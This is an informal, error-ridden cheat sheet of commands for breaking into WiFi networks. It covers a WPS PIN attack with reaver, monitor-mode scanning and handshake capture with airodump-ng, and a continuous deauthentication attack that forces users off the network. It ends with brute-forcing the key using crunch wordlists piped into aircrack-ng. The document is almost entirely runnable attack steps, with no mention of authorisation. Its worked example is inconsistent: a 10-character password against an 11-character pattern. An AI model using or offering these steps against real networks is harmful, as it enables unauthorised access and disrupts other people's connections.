wifi password cracking from a virtual machiene is not a good idea because of its resources

to crack wps
*reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv

to generate passwords
*crunch 3 5 xhwt231

now to use without saving any file 

crunch 3 29 abcdefghijklmnopqrstuvwxyz1234567890 | aircrack-ng -w - password.txt

%STARTING%

ifconfig #to see your interface

ifconfig wlan0 down 

iwconfig wlan0 mode monitor

ifconfig wlan0 up

airmon-ng check wlan0mon

kill PID

airodump-ng wlan0mon

after finding your target u can stop the scan [take a look at the power (-28 > -45)]

airodump-ng -c 4  -w scan_tst --bssid 90:00:00:00:00:00 wlan0mon 

on another tab

aireplay-ng -0 0 -a 90:00:00:00:00:00 wlan0mon

after getting an handshake u can stop the scan {but in order for it to work there must be at least one device connected on the internet}

(aircrack-ng -w /usr/share/wordlists/rockyou.txt captured_file.cap)

to use this method is highlly recomended to someting about the target's password(length; wich letters,numbers, or caracters are included)

crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w - scan_tst-01.cap -e (enter the wifi's name)

#in the example the password was 101Thunder

crunch 11 11 -t %%%%,@@@der -f charset.lst mixalpha-numeric-space | aircrack-ng -w - scan_tst-01.cap -e (enter the wifi's name)
